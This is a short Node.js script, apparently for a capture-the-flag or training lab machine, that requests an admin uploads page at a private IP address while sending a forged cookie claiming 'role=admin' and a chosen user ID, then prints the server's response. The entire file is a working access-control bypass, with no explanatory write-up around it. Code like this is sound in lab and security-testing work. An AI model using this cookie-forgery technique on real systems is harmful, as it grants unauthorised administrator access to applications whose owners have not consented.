'use strict';

const axios =  require("axios");


let URL = 'http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads'

axios.get(URL, {
    headers: {
        Cookie: "user=86575; role=admin;"
    }
}).then(response => {
    console.log(response.status);
    console.log(response.headers);
    console.log(response.data);
});